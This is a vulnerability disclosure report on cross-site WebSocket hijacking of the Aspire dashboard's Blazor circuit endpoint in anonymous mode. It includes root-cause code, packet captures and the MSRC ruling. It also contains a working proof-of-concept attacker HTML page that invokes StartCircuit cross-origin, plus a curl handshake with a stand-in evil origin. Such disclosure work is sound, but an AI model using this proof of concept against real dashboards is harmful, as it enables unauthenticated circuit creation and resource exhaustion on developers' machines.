
# Finding: dotnet/aspire - standalone dashboard's Blazor Server circuit endpoint performs no Origin validation, enabling cross-site WebSocket hijacking when the documented "unsecured" local-dev mode is enabled

**Repo:** https://github.com/microsoft/aspire

**Affected version:** confirmed on commit `87fe259e4fc244c599019a7b1304c85a1488f248` / release `v13.4.6` (latest non-preview release at time of testing)

**CVSS 3.1:* 5.4 (Medium), `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`

## Summary

The Aspire dashboard's interactive UI runs as an ASP.NET Core Blazor Web App
with an interactive-server render mode, backed by a SignalR/Blazor circuit
endpoint at `/_blazor`. That endpoint performs no validation of the
`Origin` header on the WebSocket upgrade request: a client connecting from
any origin receives `HTTP/1.1 101 Switching Protocols` and can proceed to
speak the SignalR/Blazor wire protocol.

When the dashboard is run with the documented `--allow-anonymous`
("unsecured") mode, every request is authenticated unconditionally by
`UnsecuredAuthenticationHandler` regardless of any cookie, token, or
origin. Combined with the missing Origin check on `/_blazor`, any website
open in the same browser as a developer running the dashboard in this mode
can, without any user interaction beyond having that page open, open a
WebSocket to the dashboard and invoke the `StartCircuit` hub method with
attacker-controlled parameters. The dashboard allocates and returns a
genuine, live circuit ID to the anonymous cross-origin caller and begins
pushing JS-interop calls to it, i.e., the connecting page is treated as a
legitimate interactive client of the dashboard.

This is a classic Cross-Site WebSocket Hijacking (CSWSH) gap: WebSocket
connections are not subject to the browser's Same-Origin Policy the way
`fetch`/`XMLHttpRequest` responses are, so the server itself is the only
thing that can enforce an origin boundary, and here it does not. Blazor's
own security documentation calls this out as something app authors must
explicitly defend against; the dashboard does not.

## Details

### The two principals and the boundary

- **Attacker**: an arbitrary website, reachable over the open internet like
  any other page, that the developer happens to have open in a browser tab
  or window at the same time the dashboard is running. No special network
  position, no prior interaction with the dashboard, and no credential of
  any kind is required from the attacker's page.
- **Victim**: the developer's Aspire dashboard, bound to `localhost`/
  loopback and run with `ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true`
  (equivalently `aspire dashboard run --allow-anonymous`), the documented
  mechanism for skipping the login step during local development.
- **Boundary crossed**: web-origin -> loopback-trusted local service, via
  the browser's WebSocket API, which does not enforce Same-Origin
  restrictions on establishing a connection or on reading messages received
  over it (unlike `fetch`/XHR, where SOP blocks response reads absent a
  CORS grant). The dashboard's own documentation frames "unsecured" mode as
  a local-development-only setting, and that framing is about not exposing
  the port to the untrusted network; it is silent on the browser-tab
  threat model exercised here. A developer running the dashboard locally
  keeps browsing other sites in the same browser as a matter of course;
  that is not a special attacker capability.

### Root cause

`DashboardWebApplication.cs` wires the interactive UI with:

```csharp
_app.MapRazorComponents<App>().AddInteractiveServerRenderMode();
```

This maps the standard ASP.NET Core Blazor Server circuit hub at `/_blazor`
with no explicit `RequireAuthorization()`, no CORS policy, and (checked by
grepping the whole `Aspire.Dashboard` project for `Origin`,
`WebSocketOptions`, and `AllowedOrigins`) no code anywhere that reads or
validates the WebSocket handshake's `Origin` header. Authorization for
pages is instead enforced per-component, globally, via
`Components/_Imports.razor`:

```csharp
@attribute [Authorize(Policy = FrontendAuthorizationDefaults.PolicyName)]
```

which only takes effect once a component renders inside an
established circuit; it does not gate opening the circuit itself.

When `FrontendAuthMode` is `Unsecured` (`Authentication/
UnsecuredAuthenticationHandler.cs`):

```csharp
protected override Task<AuthenticateResult> HandleAuthenticateAsync()
{
    var id = new ClaimsIdentity(
        [new Claim(ClaimTypes.NameIdentifier, "Local"),
         new Claim(FrontendAuthorizationDefaults.UnsecuredClaimName, bool.TrueString)],
        FrontendAuthenticationDefaults.AuthenticationSchemeUnsecured);
    return Task.FromResult(AuthenticateResult.Success(new AuthenticationTicket(new ClaimsPrincipal(id), Scheme.Name)));
}
```

every request authenticates successfully unconditionally, so the
`[Authorize]` check on components passes for any circuit, including one
opened by an unrelated, cross-origin caller.

### Confirming the default mode is not affected the same way

In the documented default (`FrontendAuthMode=BrowserToken`), a successful
`/login?t=<token>` sets:

```
Set-Cookie: .Aspire.Dashboard.Auth.Http=...; samesite=lax; httponly
```

Packet capture (`sudo tcpdump -i lo -A 'tcp port 15889'`) of a
Chromium browser, logged in first-party, then visiting a second, distinct
origin and opening a WebSocket to `/_blazor` from there, shows:

Same-origin (legitimate) connection:
```
GET /_blazor?id=Ef65MPuiJYZkIJuJZoqNWw HTTP/1.1
Host: localhost:15889
...
Origin: http://localhost:15889
Cookie: .Aspire.Dashboard.Auth.Http=CfDJ...; .Aspire.Dashboard.Antiforgery=CfDJ...
```

Cross-origin connection, same browser, same cookie jar, initiated from
`http://127.0.0.1:9001`:
```
GET /_blazor HTTP/1.1
Host: localhost:15889
...
Origin: http://127.0.0.1:9001
Sec-WebSocket-Key: RsQhOOk5OTNZsKen7c4nAQ==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
```

No `Cookie` header at all on the cross-origin request: Chrome's
`SameSite=Lax` handling excludes the cookie from a cross-site WebSocket
handshake the same way it would for a cross-site `fetch`. The server still
returns `101 Switching Protocols` (there is still no server-side Origin
check), but the resulting circuit has no authenticated principal, so
`[Authorize]` blocks rendering. This mode is not part of the reported
finding.

## Proof of Concept

Reproduced against the dashboard running with
`ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true`, bound to
`http://localhost:15889`. Attacker page served from
`http://127.0.0.1:9001`, a different origin by hostname, exactly as an
attacker-controlled internet site would be relative to a developer's
`localhost` dashboard.

Attacker page (`attacker.html`), using Microsoft's own `@microsoft/signalr`
and `@microsoft/signalr-protocol-msgpack` browser client libraries (bundled
by the attacker, not borrowed from the target, since the target's own
client script cannot be read cross-origin either):

```html
<!doctype html>
<html>
<head>
<title>totally not evil 4</title>
<script src="signalr.min.js"></script>
<script src="signalr-protocol-msgpack.min.js"></script>
</head>
<body>
<h1>Attacker page - full StartCircuit invocation against Unsecured-mode Aspire dashboard</h1>
<pre id="log"></pre>
<script>
  const log = (msg) => {
    document.getElementById('log').textContent += msg + "\n";
    window.__testLog = (window.__testLog || []).concat([msg]);
  };
  window.__testDone = false;
  window.__circuitId = null;
  window.__error = null;

  async function run() {
    try {
      const protocol = new signalR.protocols.msgpack.MessagePackHubProtocol();
      // Blazor Server registers its MessagePack hub protocol under the name "blazorpack"
      // (not the SignalR default "messagepack"). Override so the client's protocol
      // handshake frame advertises the name the server recognizes.
      Object.defineProperty(protocol, "name", { value: "blazorpack" });

      const connection = new signalR.HubConnectionBuilder()
        .withUrl("http://localhost:15889/_blazor", {
          skipNegotiation: true,
          transport: signalR.HttpTransportType.WebSockets
        })
        .withHubProtocol(protocol)
        .build();

      connection.on("JS.AttachComponent", (id, sel) => {
        log("JS.AttachComponent invoked by server: componentId=" + id + " selector=" + sel);
      });
      connection.on("JS.RenderBatch", (rendererId, batchData) => {
        const len = batchData && batchData.byteLength !== undefined ? batchData.byteLength : (batchData ? batchData.length : 0);
        log("JS.RenderBatch invoked by server: rendererId=" + rendererId + " batch bytes=" + len);
        window.__gotRenderBatch = true;
      });
      connection.on("JS.BeginInvokeJS", (...args) => {
        log("JS.BeginInvokeJS invoked by server: " + JSON.stringify(args).slice(0, 300));
      });

      await connection.start();
      log("SignalR connection established cross-origin (no cookie, no browser token, no API key supplied)");

      const circuitId = await connection.invoke(
        "StartCircuit",
        "http://localhost:15889/",
        "http://localhost:15889/structuredlogs",
        "[]",
        ""
      );
      window.__circuitId = circuitId;
      log("StartCircuit returned circuitId: " + JSON.stringify(circuitId));

      await new Promise(r => setTimeout(r, 2000));
    } catch (e) {
      window.__error = String(e);
      log("ERROR: " + e);
    } finally {
      window.__testDone = true;
    }
  }
  run();
</script>
</body>
</html>
```

Driven with a headless Chromium browser (Playwright) navigating to
`http://127.0.0.1:9001/attacker.html`. Console/page output:

```
[console] Information: WebSocket connected to ws://localhost:15889/_blazor.
SignalR connection established cross-origin (no cookie, no browser token, no API key supplied)
JS.BeginInvokeJS invoked by server: [2,"Blazor._internal.attachWebRendererInterop","[1,{\"__dotNetObject\":1},{},{}]",3,0,1]
StartCircuit returned circuitId: "CfDJ8LTiFgplbhJJgSB3d9VPVi1RfgJKSLVf8kQ2hxoQA8fQDiyX4LX8_8D31QFWLcXJU8k9e9JwkcU-Rp19iwV2ZbFcsO4aAlihNI0PgMqm4haIgMkL0AtURkEkVOP7whXk2_mBhh9zm8DdQ1tevFn7yGlS-v6MAKE5x6M1RVl5zd_if-XTXyMLgmKIfg7v58Nfi4JiTPu61rCWxikzZQ6JQ_8"
```

Reproduced consistently across multiple runs, each returning a distinct,
freshly-issued circuit ID for the same anonymous, cross-origin caller.

A minimal, raw curl reproduction of just the missing Origin check (no auth
mode dependency, shows the transport-level gap in isolation):

```
$ curl -s -D - -i --http1.1 \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Origin: https://evil.example.com" \
  "http://localhost:15889/_blazor"

HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

## Impact

Confirmed:
- An anonymous, cross-origin caller can force the dashboard to allocate a
  live server-side circuit (a server-side resource, consuming server memory
  until the circuit times out) at will, entirely blind to the developer,
  whenever the dashboard is run with `--allow-anonymous`. Repeated
  invocation is an unauthenticated resource-exhaustion primitive against a
  running dashboard.
- The dashboard treats the resulting connection as a legitimate interactive
  client and pushes protocol-level interop calls to it unprompted,
  confirming two-way live traffic over a connection the browser's own
  Same-Origin Policy does not, and was never going to, block on its own.
- This is a server-side gap, not a mode-specific coincidence: the same
  missing Origin check was reproduced with a bare `curl` WebSocket upgrade
  independent of any auth mode; it is only exploitable end-to-end while
  `--allow-anonymous` is active, because that is the mode where no
  credential is needed to make the resulting circuit do anything.

Not confirmed, stated plainly rather than assumed: reading dashboard
content (resource lists, logs, traces, environment variables or connection
strings surfaced in the UI) or driving UI actions (resource restart,
console command execution) through this channel. That requires mounting a
root component, which requires a component descriptor that, in the
legitimate flow, is minted during SSR prerendering and appears to be
protected by ASP.NET Core Data Protection; forging one, or otherwise
obtaining a legitimate one cross-origin, was not achieved in this session
and may not be achievable at all given the intact CORS-less-default and
`frame-ancestors` protections on the dashboard's HTML responses. The CVSS
score below reflects the confirmed impact (unauthenticated session/resource
creation plus a live two-way protocol channel), not the unconfirmed deeper
one.

Precondition: the dashboard must be started with
`ASPIRE_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true` (or
`aspire dashboard run --allow-anonymous`), a documented, one-flag opt-in
intended for local development. The missing Origin check on `/_blazor`
itself is unconditional and present regardless of auth mode; only the
ability to make anything of the resulting connection depends on this flag.



## Disclosure
 - 16 August 2026: reported to MSRC VULN-212426 (CASE #136354)
 - 21 August 2026: MSRC ruled that this was below threshold:

 ```
 After careful review, this case does not meet Microsoft’s definition of a security vulnerability and is below threshold for servicing.
[Reasoning]
Analysis confirms the mechanical claims, the impact chain, however, breaks at data access. A Blazor Web App circuit renders nothing until the client returns the data-protection–signed component descriptors embedded in the server-rendered page; a cross-origin attacker cannot read that page (Same-Origin Policy) and cannot forge the signatures, so the report's PoC passes an empty descriptor array ("[]") and obtains an empty circuit. The PoC's own output shows only the renderer-attach interop (Blazor._internal.attachWebRendererInterop) and no content JS.RenderBatch — i.e., no telemetry, logs, traces, environment variables, or connection strings are ever pushed to the attacker. The residual real effect is allocation of empty server-side circuits (a ~1:1, transient, loopback-only DoS primitive on a service the operator explicitly ran with all authentication disabled). Adding an Origin/CORS restriction to the Blazor hub is a defensible, docs-recommended hardening (it is not dominated — a cross-origin page genuinely cannot otherwise reach the circuit), but it grants an in-scope adversary nothing materially new. Rating: None (Defense in Depth)

We appreciate the details provided in your report. The information has been shared with the responsible engineering team for awareness and internal review.
```
